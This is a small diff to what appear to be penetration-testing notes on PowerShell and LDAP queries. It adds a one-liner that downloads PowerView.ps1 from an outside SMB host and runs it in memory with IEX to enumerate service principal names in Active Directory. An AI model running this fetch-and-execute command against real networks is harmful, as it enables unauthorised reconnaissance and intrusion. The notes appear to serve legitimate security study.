@@ -14,3 +14,11 @@ Powershell Directory Tree Query Terms
 
 Powershell LDAP Query Terms
 - https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query
+
+
+
+
+
+Enum SPN's Oneliner SMBv2
+
+```IEX(New-Object Net.webClient).downloadString('\\192.168.119.135\pwn\PowerView.ps1');Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize```
